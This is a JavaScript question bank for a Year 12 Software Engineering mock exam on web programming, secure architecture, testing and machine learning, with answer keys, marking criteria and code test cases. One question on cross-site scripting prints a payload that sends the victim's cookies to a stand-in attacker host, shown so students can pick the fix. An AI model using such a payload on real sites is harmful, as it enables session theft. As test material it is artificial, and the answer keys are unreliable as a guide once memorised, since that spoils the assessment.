/* Syllabus Mock 3. Original paper, one of five (banks 14 to 18) that together cover
   the whole Year 12 Software Engineering syllabus. Layout follows the 2025 HSC:
   27 questions, 80 marks. See docs/SYLLABUS_MOCKS.md for the coverage map. */
(function(){
var SEP='Software Engineering Project',PW='Programming for the Web',SSA='Secure Software Architecture',SA='Software Automation';
var DB21={
 Products:{c:['ProductID','Name','Category','Price'],r:[
  ['P1','Swallowtail 5ft 8','Shortboard',780],['P2','Cruiser 9ft 2','Longboard',1150],['P3','Grom 4ft 10','Shortboard',540],
  ['P4','Tri-fin set','Accessories',95],['P5','Leg rope 7ft','Accessories',45],['P6','Noserider 9ft 6','Longboard',1290]]},
 Orders:{c:['OrderID','OrderDate','State'],r:[
  ['O1','2026-01-14','QLD'],['O2','2026-02-03','NSW'],['O3','2025-12-20','QLD'],['O4','2026-03-11','VIC'],['O5','2026-04-02','NSW'],['O6','2026-05-18','QLD']]},
 OrderItems:{c:['OrderID','ProductID','Qty'],r:[
  ['O1','P1',1],['O1','P4',2],['O2','P2',1],['O2','P5',3],['O3','P6',1],['O4','P1',2],['O5','P3',2],['O5','P5',1],['O6','P6',1],['O6','P4',1]]}};
var PF=['Pass','Fail'],TT=['Boundary','Path','Abnormal'];
var qs=[];

/* ---------- Questions 1 to 11: 1 mark each ---------- */
qs.push(Q(SEP,'',[
 mc('In a WAgile project, when are Agile practices usually applied?',['Only at the end of the project, when user documentation is written after the system has been released','Every day during requirements gathering, but no code is written until the end of the project','After requirements and high-level design are signed off, building and testing happen in short iterations','Whenever individual developers prefer, with no planned structure or sign-off between stages'],2,'WAgile keeps Waterfall\'s up-front planning and sign-off gates, then intervenes with Agile iterations during development and testing.')]));
qs.push(Q(PW,'Web programming is used for different kinds of applications.',[
 mt('Classify each application.',['Application','Interactive website','E-commerce','Progressive web app'],[
  ['A council site where residents use a map to check their bin collection day',0],
  ['A surf shop site that takes card payments for boards and tracks each order',1],
  ['A tide chart installed to a phone\'s home screen that works offline at the beach',2]],1,'An interactive website responds to user input; e-commerce handles buying and selling online; a PWA can be installed and work offline using a service worker.')]));
qs.push(Q(SEP,'In ASCII (and Unicode), the code for "A" is 65 and the code for "a" is 97. Consider the following Python code.'+code(`word = "Surf"
result = ""
for ch in word:
    if "a" <= ch <= "z":
        result = result + chr(ord(ch) - 32)
    else:
        result = result + chr(ord(ch) + 32)
print(result)`),[
 mc('What is displayed when this code is run?',['sURF','Surf','SURF','surf'],0,'Each upper-case letter\'s code is 32 less than its lower-case letter\'s code. The loop subtracts 32 from lower-case letters and adds 32 to the others, so the case of every letter is swapped: S becomes s, and u, r and f become U, R and F.')],{two:true}));
qs.push(Q(SSA,'',[
 mc('Which action is an example of hardening a web server?',['Adding more memory and processors so that the server responds faster','Disabling unused services and default accounts, and closing unneeded ports','Moving the server to a larger data centre with better cooling','Allowing every developer to log in to the server as the administrator'],1,'Hardening reduces the attack surface by removing anything an attacker could use, such as unused services, default credentials and open ports.')]));
qs.push(Q(PW,'A surf shop publishes the SHA-256 hash value of its app installer on its website. A customer downloads the installer, calculates its hash and gets a different value.',[
 mc('What should the customer conclude?',['The customer\'s internet connection is too slow','The installer is genuine, because hash values change every time they are calculated','The hash value can be decrypted to recover the original installer','The installer has been altered or corrupted, so it should not be installed'],3,'A hash function always gives the same output for the same input, and any change to the file changes the hash. A different hash means the file is not the one the shop published.')]));
qs.push(Q(SSA,'A search page uses this JavaScript to show the search term at the top of the results.'+code(`// Read the search term from the address, eg results.html?q=boards
const term = new URLSearchParams(window.location.search).get("q");
document.getElementById("heading").innerHTML = "Results for " + term;`)+'<p>An attacker sends people a link in which <code>q</code> is:</p>'+code(`<img src="x" onerror="fetch('https://evil.example/?c=' + document.cookie)">`),[
 mc('Which change to the code would best prevent this cross-site scripting attack?',['Replace the term with its hash value before it is added to the heading','Rename the heading element so the attacker cannot guess its id value','Serve the results page over HTTPS so the term is encrypted while in transit','Set textContent instead of innerHTML, so the term is shown as text and never run'],3,'innerHTML treats the term as HTML, so the injected image tag runs its onerror script and sends the victim\'s cookies to the attacker. textContent displays the term as plain text, so nothing in it can run.')],{two:true}));
qs.push(Q(SEP,'A tram journey planner is written using facts and rules.'+code(`FACT  connects(Central, Museum)
FACT  connects(Museum, Harbour)
FACT  connects(Harbour, Beach)
RULE  reachable(X, Y) IF connects(X, Y)
RULE  reachable(X, Y) IF connects(X, Z) AND reachable(Z, Y)
QUERY reachable(Central, Beach)?`),[
 mc('Which statement about this program is correct?',['It uses the logic paradigm, and the query succeeds because the rules link Central to Beach through Museum and Harbour','It uses the functional paradigm, and the query succeeds because each line is a function that runs in order','It uses the imperative paradigm, and the query fails because there is no fact stating connects(Central, Beach)','It uses the logic paradigm, and the query fails because there is no fact stating connects(Central, Beach)'],0,'Facts, rules and queries belong to the logic paradigm. The second rule applies repeatedly (Central to Museum, Museum to Harbour, Harbour to Beach), so the system can prove the query even though no single fact states it.')],{two:true}));
qs.push(Q(PW,'Some tasks in an online surf shop run in the browser and some run on the server.',[
 dm('Drag each label into the box beside each task to show where the task should run. A label may be used more than once.',['Client-side','Server-side'],[
  ['Showing a preview of a custom surfboard as the customer changes its colour',0],
  ['Calculating the final price from current costs held in the database',1],
  ['Hiding the delivery address fields when "Pick up in store" is ticked',0],
  ['Sending the order confirmation email',1]],1,{reuse:true,why:'Instant visual changes happen in the browser. Anything that uses the database, must be trusted or sends email belongs on the server.'})]));
qs.push(Q(SEP,'A team of three has two weeks to add online payments, redesign the product page and fix 15 minor bugs. One developer specialises in payments, one in front-end design, and one is a junior developer.',[
 mc('Which allocation of resources is the most appropriate?',['All three work together on payments first, then on the redesign, then on the bugs','Each specialist leads their own area, and the junior developer fixes the minor bugs with support','The junior developer builds payments, so the two specialists can review the work at the end','All work is delayed until a full-time project manager has been hired to plan the tasks'],1,'Allocating tasks according to expertise lets the work proceed in parallel and gives the junior developer suitable tasks with support.')]));
qs.push(Q(SSA,'',[
 ms('Which of the following are benefits of developing secure software?<br>(More than one may be selected.)',['Personal data is protected from unauthorised access','The software will never need updates','Testing is no longer required','Users and clients are more likely to trust the product','There are fewer vulnerabilities for attackers to exploit'],[0,3,4],1,'Secure development protects data and reduces vulnerabilities, which builds trust. Secure software still needs testing and updates as new threats appear.')]));
qs.push(Q(PW,'The World Wide Web Consortium (W3C) works across several areas of web development.',[
 dm('Match each area to its description by dragging the labels into the boxes.',['Web Accessibility Initiative','Internationalisation','Web security','Privacy','Machine-readable data'],[
  ['Guidelines so people with disabilities can perceive, operate and understand web content',0],
  ['Standards that let pages display any script and adapt to local date and number formats',1],
  ['Specifications such as content security policies and secure authentication in browsers',2],
  ['Guidance that limits browser features that could be used to track people across sites',3],
  ['Formats that let software automatically understand the meaning of data on a page',4]],1,{why:'Each description matches one W3C focus area: accessibility (WAI), internationalisation, web security, privacy and machine-readable (structured) data.'})]));

/* ---------- Questions 12 and 13: 2 marks each ---------- */
qs.push(Q(PW,'Several protocols are used to send and receive email and files.',[
 gd('For each protocol, select its default port and its main purpose.',['Protocol','Default port','Main purpose'],[
  ['SMTP',[['22','25','110','143'],1],[['Sends email to a mail server','Downloads email to one device, usually removing it from the server','Keeps email on the server, synchronised across devices','Transfers files over an encrypted SSH connection'],0]],
  ['POP3',[['22','25','110','143'],2],[['Sends email to a mail server','Downloads email to one device, usually removing it from the server','Keeps email on the server, synchronised across devices','Transfers files over an encrypted SSH connection'],1]],
  ['IMAP',[['22','25','110','143'],3],[['Sends email to a mail server','Downloads email to one device, usually removing it from the server','Keeps email on the server, synchronised across devices','Transfers files over an encrypted SSH connection'],2]],
  ['SFTP',[['22','25','110','143'],0],[['Sends email to a mail server','Downloads email to one device, usually removing it from the server','Keeps email on the server, synchronised across devices','Transfers files over an encrypted SSH connection'],3]]],2,'SMTP (25) sends mail; POP3 (110) downloads it to one device; IMAP (143) keeps it on the server and synchronises devices; SFTP (22) transfers files over SSH.')]));
qs.push(Q(SA,'A single neuron in a neural network receives two inputs. It uses a step activation function that outputs 1 when the weighted sum plus bias is 0 or more, and 0 otherwise.'+fig('Neuron','<svg viewBox="0 0 380 170" width="380" role="img" aria-label="A neuron with two weighted inputs and a bias"><g font-family="Arial" font-size="13" fill="#000"><circle cx="40" cy="45" r="28" fill="#fff" stroke="#555"/><text x="40" y="50" text-anchor="middle">x₁ = 2</text><circle cx="40" cy="125" r="28" fill="#fff" stroke="#555"/><text x="40" y="130" text-anchor="middle">x₂ = −1</text><line x1="68" y1="50" x2="180" y2="80" stroke="#555"/><line x1="68" y1="120" x2="180" y2="92" stroke="#555"/><text x="110" y="55">w₁ = 0.5</text><text x="110" y="128">w₂ = 0.8</text><circle cx="210" cy="86" r="30" fill="#eaf1fb" stroke="#555"/><text x="210" y="82" text-anchor="middle">Σ, step</text><text x="210" y="98" text-anchor="middle">b = 0.1</text><line x1="240" y1="86" x2="320" y2="86" stroke="#555"/><text x="330" y="90">output</text></g></svg>'),[
 dd('Select the correct value from each dropdown menu.','The weighted sum plus bias is {0}, so the neuron outputs {1}.',[[['−0.3','0.3','1.1','1.9'],1],[['0','1'],1]],2,'(2 × 0.5) + (−1 × 0.8) + 0.1 = 1.0 − 0.8 + 0.1 = 0.3. As 0.3 is 0 or more, the step function outputs 1.')],{two:true}));

/* ---------- Question 14: 1 mark ---------- */
qs.push(Q(SEP,'Consider the following pseudocode. The two-dimensional array Grid has 3 rows and 3 columns, with positions numbered from 1.'+code(`Grid = [[3, 8, 1],
        [6, 2, 9],
        [5, 7, 4]]
Set total = 0
FOR r = 1 TO 3
    FOR c = 1 TO 3
        IF r + c = 4 THEN
            total = total + Grid[r][c]
        ENDIF
    NEXT c
NEXT r
Display total`),[
 dd('Select the correct item from the dropdown menu to show the value displayed.','The value displayed is {0}.',[[['8','9','13','15'],0]],1,'r + c = 4 is true for (1, 3), (2, 2) and (3, 1), the anti-diagonal: 1 + 2 + 5 = 8.')],{two:true}));

/* ---------- Question 15: 6 marks ---------- */
qs.push(Q(SEP,'An online surf shop charges shipping as follows.'+bl(['Orders under $100: $15','Orders from $100 up to but not including $500: $8','Orders of $500 or more: free','A total of 0 or less is invalid.'])+'<p>A tester has started a test log for the shipping function.</p>',[
 P('(a)',gd('Select the correct entries to complete the test log. (3 marks)',['Test data (order total)','Expected output','Actual output','Result','Type of test'],[
  ['99.99','$15','$15','Pass','Boundary'],
  ['500.00','$0','$8',[PF,1],[TT,0]],
  ['250.00','$8','$8',[PF,0],[TT,1]],
  ['-20.00','Invalid total','$15',[PF,1],[TT,2]]],3,'A test passes only when actual output matches expected output. 500.00 is a boundary value, 250.00 checks the middle path and −20.00 is abnormal data.')),
 P('(b)',tx('Explain the difference between path testing and boundary testing, using the shipping function as an example. (3 marks)',3,65,'Path testing chooses data so that every route through the code is run at least once, for example one order under $100, one between $100 and $500, one of $500 or more and one invalid total, so each branch of the IF statement is executed. Boundary testing chooses values at and either side of the points where behaviour changes, such as $99.99, $100, $499.99 and $500, because errors such as using > instead of >= occur there. The failed test at $500 shows a boundary error that a path test with $600 would have missed.',['1 mark: path testing exercises every branch or route through the code.','1 mark: boundary testing uses values at and around the limits.','1 mark: relevant examples from the shipping function (eg $500 boundary).']))],{two:true}));

/* ---------- Question 16: 9 marks ---------- */
qs.push(Q(PW,'A surfboard shaper has taken orders through social media for years. With a second developer, she is building an online store where customers can browse boards, customise length and fins, and pay. The store will grow to hundreds of product pages.',[
 P('(a)',tx('Explain how cascading style sheets (CSS) can give the store a consistent appearance, and how CSS maintenance tools help as the store grows. (3 marks)',3,65,'All pages link to the same external style sheets, so headings, buttons and colours look the same on every page, and the layout adapts consistently to phones and desktops with media queries. As the store grows, maintenance tools help: a preprocessor such as Sass allows variables for brand colours and reusable rules, so a change is made once, and a linter finds errors and inconsistent rules before they reach the live site.',['1 mark: shared external style sheets give a consistent appearance.','1 mark: names a relevant CSS maintenance tool (eg preprocessor, linter, framework).','1 mark: explains how the tool reduces effort or errors as the site grows.'])),
 P('(b)',tx('Describe how the web server software, web framework and database work together when a customer opens a product page. (3 marks)',3,65,'The web server software receives the HTTPS request and serves static files such as images directly, passing the product page request to the web framework. The framework routes the request to the right code, which uses objects and libraries to query the database for the board\'s details, price and stock. The framework inserts the data into a template, and the web server sends the finished HTML back to the browser.',['1 mark: role of web server software in receiving requests and returning responses.','1 mark: role of the framework (routing, objects, libraries, templates).','1 mark: the database query and the flow of data back to the browser.'])),
 P('(c)',tx('Explain how version control would support the two developers building the store. (3 marks)',3,65,'Version control such as Git keeps the full history of every change, with who made it and why, so a change that breaks checkout can be found and reverted. Each developer can work on a separate branch, for example payments and product pages, without overwriting the other\'s work, then merge when the feature is tested. A shared remote repository acts as an off-site backup and lets them review each other\'s code before it goes live.',['1 mark: history and the ability to revert to earlier versions.','1 mark: branching and merging so both can work at the same time.','1 mark: a further benefit linked to the scenario (eg backup, code review, accountability).']))],{two:true}));

/* ---------- Questions 17 to 19 ---------- */
qs.push(Q(SEP,'',[
 od('Place the following steps of a binary search algorithm in the correct order by dragging the steps into position. The list is sorted in ascending order.',`
# BEGIN BinarySearch(list, target)
    = Set low = 1
    Set high = LENGTH(list)
    = Set found = False
    WHILE low <= high AND found = False
        Set mid = INT((low + high) / 2)
        IF list[mid] = target THEN
            Set found = True
        ELSEIF list[mid] < target THEN
            Set low = mid + 1
        ELSE
            Set high = mid - 1
        ENDIF
    ENDWHILE
    RETURN found
# END BinarySearch`,3,{extra:['Set low = mid - 1'],why:'The loop repeats while there is still a range to search. The middle item is compared with the target: if it is smaller, the search continues in the upper half; if larger, in the lower half.'})]));
qs.push(Q(SSA,'',[
 tx('Explain how code review contributes to managing the security of programming code. Include ONE limitation of code review.',3,65,'In a code review, another developer reads each change before it is merged, checking for problems such as unvalidated input, hard-coded passwords or missing authorisation checks. A second person with a different point of view catches mistakes the author missed, and reviewers share secure coding knowledge across the team. A limitation is that it depends on the reviewers\' skill and attention and is slow for large changes, so it should be combined with automated testing such as SAST and DAST.',['1 mark: describes code review as people examining code before it is accepted.','1 mark: explains how it finds security flaws or improves secure practice.','1 mark: a valid limitation.'])]));
qs.push(Q(SSA,'An ordering system asks for the number of boards a customer wants. The quantity must be a whole number from 1 to 20.',[
 py('Write a function <code>read_quantity()</code> in Python. It must keep asking for a quantity until a valid one is entered, display <code>Invalid</code> after each invalid entry (including text such as <code>abc</code>), and return the valid quantity. Use exception handling. The last line of the program is shown.',3,`def read_quantity():
    # your code here


print("Quantity:", read_quantity())`,`def read_quantity():
    while True:
        entry = input("Quantity (1-20): ")
        try:
            quantity = int(entry)
            if 1 <= quantity <= 20:
                return quantity
        except ValueError:
            pass
        print("Invalid")


print("Quantity:", read_quantity())`,[{i:['abc','0','25','7'],o:'Invalid\nInvalid\nInvalid\nQuantity: 7'},{i:['12'],o:'Quantity: 12'},{i:['3.5','-2','20'],o:'Invalid\nInvalid\nQuantity: 20'},{i:['','1'],o:'Invalid\nQuantity: 1'}],['1 mark: uses exception handling so non-numeric input does not crash the program.','1 mark: range check for 1 to 20 inclusive.','1 mark: repeats until valid, displays Invalid each time and returns the quantity.'])],{two:true}));

/* ---------- Questions 20 to 22 ---------- */
qs.push(Q(PW,'A customer who uses a screen reader reports that she cannot complete checkout in the surf shop. The checkout form uses grey placeholder text instead of labels, shows errors only by turning fields red, and has a "Pay" button that is an image with no text.',[
 tx('Describe THREE changes, based on the Web Accessibility Initiative (WAI) guidelines, that would make the checkout accessible.',3,65,'Each input should have a visible label linked to it in the HTML, so the screen reader announces what each field is for. Errors should be described in text next to the field and announced, for example "Postcode must be 4 digits", rather than shown only by colour. The Pay button should be a real button element with text, or an image with alternative text, so it can be identified and reached using the keyboard.',['1 mark: a change addressing labels for the form fields.','1 mark: a change addressing errors shown only by colour.','1 mark: a change addressing the image button (text alternative or real button), linked to WAI principles.'])]));
qs.push(Q(PW,'The surf shop stores its data in three related tables, Products, Orders and OrderItems.',[
 sq('Construct a SQL query that displays each product Category and the total revenue from orders placed in 2026 that were delivered to QLD or NSW. The revenue for each order item is Qty multiplied by Price.<br>Use the column headings Category and Revenue. List the results from the highest to the lowest revenue.',4,`SELECT Products.Category, SUM(OrderItems.Qty * Products.Price) AS Revenue
FROM Orders, OrderItems, Products
WHERE Orders.OrderID = OrderItems.OrderID
AND OrderItems.ProductID = Products.ProductID
AND Orders.OrderDate >= '2026-01-01' AND Orders.OrderDate <= '2026-12-31'
AND (Orders.State = 'QLD' OR Orders.State = 'NSW')
GROUP BY Products.Category
ORDER BY Revenue DESC`,true,['1 mark: links all three tables on the correct keys (in the WHERE clause or with JOINs).','1 mark: restricts orders to 2026.','1 mark: restricts the state to QLD or NSW (with correct grouping of the OR condition).','1 mark: sums Qty × Price by Category with the required headings and order.'])],{two:true,db:DB21}));
qs.push(Q(SEP,'The surfboard shaper wants customers to order a custom board through these screens.'+bl(['<b>Home</b>: a "Custom board" button.','<b>Choose model</b>: three board models, each with a "Select" button.','<b>Customise</b>: length and fin set-up, with a "Review" button.','<b>Review and pay</b>: a summary, an "Edit" button that returns to Customise, and a "Pay" button.','<b>Confirmation</b>: an order number and a "Home" button.']),[
 dr('Create a storyboard for the custom board order that shows the five screens and how the user moves between them.',3,'Five labelled screen frames: Home, Choose model, Customise, Review and pay, Confirmation. Each frame sketches its main elements (buttons, model choices, length and fin options, summary). Arrows labelled with the button pressed: Custom board (Home to Choose model), Select (Choose model to Customise), Review (Customise to Review and pay), Edit (Review and pay back to Customise), Pay (Review and pay to Confirmation), Home (Confirmation to Home).',['1 mark: all five screens shown with their key interface elements.','1 mark: navigation arrows in the correct directions, including the Edit loop back to Customise.','1 mark: arrows labelled with the action or button that causes each transition.'],'storyboard')],{two:true}));

/* ---------- Question 23: 9 marks ---------- */
qs.push(Q(SSA,'A regional water utility was hit by ransomware. The slides summarise the incident.'+slides([
 slide('What happened','<p>A staff member opened an email attachment that installed ransomware.</p><p>Billing servers and staff laptops were encrypted, and a ransom was demanded.</p>','<div style="font-size:52px" aria-hidden="true">🔒</div>'),
 slide('Impact','<p>Customers could not pay bills online for nine days.</p><p>Plant monitoring screens were unavailable for six hours.</p><p>Some backups were stored on the same network and were also encrypted.</p>','<div style="font-size:52px" aria-hidden="true">⚠️</div>'),
 slide('Found afterwards','<p>Several servers had not been patched for two years.</p><p>Plant controllers still used their factory passwords.</p><p>There was no written plan for keeping services running during an outage.</p>','<div style="font-size:52px" aria-hidden="true">🔍</div>')]),[
 P('(a)',tx('Explain how business continuity and disaster recovery plans would have reduced the impact of this incident. (3 marks)',3,65,'A business continuity plan sets out how essential services keep running during an outage, for example taking payments by phone, and switching plant monitoring to manual readings recorded on paper, so customers and water quality are protected. A disaster recovery plan sets out how systems are restored, including offline or off-site backups that ransomware cannot reach, the order in which systems are rebuilt and target recovery times, so billing would have been restored in hours rather than nine days.',['1 mark: business continuity keeps essential functions running during the outage.','1 mark: disaster recovery restores systems and data, eg from offline backups.','1 mark: links both to reducing the impact described in the slides.'])),
 P('(b)',tx('Describe how the utility could test and improve the security and resilience of its systems in future. (3 marks)',3,65,'Regular vulnerability assessments and penetration tests would find weaknesses such as unpatched servers and factory passwords before attackers do. The utility should harden its systems by patching on a schedule, changing default passwords, closing unused ports and separating the plant network from office computers. Resilience can be tested by running simulated incidents and restoring from backups to confirm recovery actually works.',['1 mark: identifies testing to find vulnerabilities (eg vulnerability assessment, penetration testing).','1 mark: describes hardening measures linked to the weaknesses found.','1 mark: describes testing resilience (eg recovery drills, restoring backups, simulated attacks).'])),
 P('(c)',dm('Drag each action into the box that shows the part of the utility\'s security response it belongs to. (3 marks)',['Hardening','Handling the breach','Business continuity','Disaster recovery'],[
  ['Restoring the billing database from offline backups onto a clean server',3],
  ['Switching plant monitoring to manual readings recorded on paper',2],
  ['Isolating infected computers from the network and notifying affected customers',1],
  ['Replacing factory passwords on plant controllers and applying security patches',0]],3,{why:'Restoring systems is disaster recovery; keeping operations going manually is business continuity; containing the attack and notifying people is handling the breach; removing weaknesses in advance is hardening.'}))],{two:true}));

/* ---------- Questions 24 to 27 ---------- */
qs.push(Q(SA,'A company produces a smart-home system for people with limited mobility. Lights, doors, blinds and heating are controlled by voice or eye-tracking. Machine learning learns each user\'s routines and speech patterns, and can alert a carer if it detects a fall.',[
 tx('Explain the impact of this automation on people with disability. Include benefits and concerns in your answer.',5,110,'The system can greatly increase independence: a person who cannot reach switches or doors can control their home by voice or eye movement, reducing reliance on carers and improving dignity and quality of life. Because machine learning adapts to each person\'s speech, users with speech impairments may be understood better over time, and learned routines reduce effort. Fall detection improves safety by getting help quickly.<br>There are concerns. Speech and eye-tracking models trained mostly on people without disability may work poorly at first, leading to frustration or failure in urgent situations, so the training data must include diverse users. If the system or internet fails, the person could be locked in or unable to call for help, so manual and offline back-ups are essential. Constant monitoring raises privacy concerns about recordings of private life, and the cost may put it out of reach of many people who would benefit.',['5 marks: explains benefits and concerns in detail, with clear links to the needs of people with disability and the features described.','4 marks: explains benefits and concerns with some links to the scenario.','3 marks: explains benefits or concerns in detail, or both briefly.','2 marks: describes some impacts.','1 mark: provides some relevant information.'])],{two:true}));
qs.push(Q(SEP,'A team is building a customer portal for the water utility.'+bl(['Senior managers, who are the client, rarely attend progress meetings, so decisions are delayed.','Field staff who will use the portal on tablets have never been asked for their views.','The billing department wants many detailed fields on every screen, while customer surveys ask for a simpler portal.']),[
 tx('Explain how the team could manage these communication issues. In your answer, refer to involving and empowering the client, enabling feedback, negotiating, and the team\'s ethical responsibilities to stakeholders.',5,110,'Involving and empowering the client: the team could agree a short regular demonstration at a time managers can attend and name one manager as product owner with authority to make decisions, so delays stop and the client feels ownership of the portal.<br>Enabling feedback: field staff should be included through interviews, prototype testing on tablets and a simple feedback form in each release, so the portal suits the people who will use it. Feedback should be recorded and the team should report what was changed as a result.<br>Negotiating: the conflict between billing and customers can be resolved by presenting evidence such as survey results and usability tests and agreeing a compromise, for example a simple customer view with an advanced view for billing staff, documenting the decision.<br>Ethically, the team must treat all stakeholders fairly, be honest about what is feasible in the time and budget, respect customers\' privacy and not favour the most powerful group at the expense of users.',['5 marks: explains how all four aspects address the issues, with specific strategies linked to the scenario.','4 marks: explains most aspects with relevant strategies.','3 marks: explains some aspects, or all with limited links to the scenario.','2 marks: describes some communication strategies.','1 mark: provides some relevant information.'])],{two:true}));
qs.push(Q(SA,'A water utility predicts daily water use (megalitres) from the maximum temperature (°C). Two models have been fitted to five days of data.'+code(`temps = [18, 22, 26, 30, 34]
usage = [41, 44, 52, 66, 85]`)+bl(['Linear model: <i>y</i> = 2.75<i>x</i> − 12','Polynomial model: <i>y</i> = 0.1<i>x</i>² − 2.7<i>x</i> + 57'])+'<p>The mean squared error (MSE) of a model is the average of (actual − predicted)² over all the data.</p><p>The program must define a class <code>LinearModel</code> and a class <code>PolynomialModel</code>, each with a <code>predict(x)</code> method, and a function <code>mse(model, xs, ys)</code> that works with an object of either class. It displays the MSE of each model to 2 decimal places and the better model, then reads a temperature and displays the better model\'s prediction to 1 decimal place.</p><p>For the input 28 the output is:</p>'+code(`Linear MSE: 24.25
Polynomial MSE: 5.49
Better model: Polynomial
Predicted use: 59.8`),[
 py('Using object-oriented programming in Python, write the program. Start your program with the two lists shown.',5,`temps = [18, 22, 26, 30, 34]
usage = [41, 44, 52, 66, 85]
`,`temps = [18, 22, 26, 30, 34]
usage = [41, 44, 52, 66, 85]

class LinearModel:
    def __init__(self, slope, intercept):
        self.slope = slope
        self.intercept = intercept

    def predict(self, x):
        return self.slope * x + self.intercept

class PolynomialModel:
    def __init__(self, a, b, c):
        self.a = a
        self.b = b
        self.c = c

    def predict(self, x):
        return self.a * x ** 2 + self.b * x + self.c

def mse(model, xs, ys):
    total = 0
    for i in range(len(xs)):
        total = total + (ys[i] - model.predict(xs[i])) ** 2
    return total / len(xs)

linear = LinearModel(2.75, -12)
poly = PolynomialModel(0.1, -2.7, 57)
linear_error = mse(linear, temps, usage)
poly_error = mse(poly, temps, usage)
print("Linear MSE:", round(linear_error, 2))
print("Polynomial MSE:", round(poly_error, 2))
if poly_error < linear_error:
    best = poly
    print("Better model: Polynomial")
else:
    best = linear
    print("Better model: Linear")
temperature = float(input("Temperature: "))
print("Predicted use:", round(best.predict(temperature), 1))`,[{i:['28'],o:'Linear MSE: 24.25\nPolynomial MSE: 5.49\nBetter model: Polynomial\nPredicted use: 59.8'},{i:['20'],o:'Linear MSE: 24.25\nPolynomial MSE: 5.49\nBetter model: Polynomial\nPredicted use: 43.0'},{i:['36'],o:'Linear MSE: 24.25\nPolynomial MSE: 5.49\nBetter model: Polynomial\nPredicted use: 89.4'}],['1 mark: LinearModel and PolynomialModel classes, each storing its coefficients and with a correct predict method.','1 mark: mse function loops over the data and squares each error.','1 mark: mse returns the average, giving the correct values.','1 mark: compares the errors and selects the better model object, calling predict on either class through the same interface (polymorphism).','1 mark: reads the temperature and displays all output in the required format.'])],{two:true}));
qs.push(Q(SA,'A city council trains a machine learning model to decide which footpaths to repair first. The training data is ten years of repair requests made through the council\'s app and website, labelled with whether a repair was carried out. Council staff reviewed each request and decided which repairs were approved.<p>An audit finds that:</p>'+bl(['most requests came from a few suburbs where residents use the app heavily','suburbs with many older residents and non-English speakers made few requests','in the past, staff tended to approve repairs near shopping centres.']),[
 tx('Evaluate the effect of human and dataset source bias on this solution, and recommend how the bias could be reduced.',6,185,'Dataset source bias: because the data comes from app and website requests, it measures where people complain rather than where footpaths are damaged. Suburbs that use the app heavily are over-represented, while suburbs with older residents and non-English speakers, who are less likely to use the app, are under-represented. The model will therefore learn that damage occurs mostly in the active suburbs and keep sending repairs there.<br>Human bias: the labels are past staff decisions, and staff favoured shopping centres. The model treats these decisions as correct answers, so it learns and repeats the same preference, giving it an appearance of objectivity.<br>The effect is serious: the people most at risk from uneven footpaths, older residents and people with disability, may wait longest, and over time the model\'s choices produce more data from the same areas, making the bias worse. This is unfair and could expose the council to complaints and liability.<br>To reduce the bias, the council should collect representative data, for example systematic inspections of every suburb or sensors on council vehicles, label damage using consistent criteria rather than past approvals, test the model\'s results across suburbs and age groups before use, include residents in multiple languages, and keep a human review of the priority list. With these changes, the model could make repairs fairer and faster, but in its current form it should not be used.',['6 marks: makes an informed judgement about the effects of both human and dataset source bias, with detailed reasoning linked to the scenario and specific, realistic recommendations.','5 marks: evaluates both types of bias with clear links to the scenario and relevant recommendations.','3–4 marks: explains the effects of bias and gives some recommendations, but one type of bias or the evaluation is limited.','2 marks: describes some effects of bias or some recommendations.','1 mark: provides some relevant information.'])],{two:true}));

BANKS.push({id:'16',name:'Syllabus Mock 3',sub:'Original paper · set 3 of 5 covering the whole syllabus',qs:qs});
})();
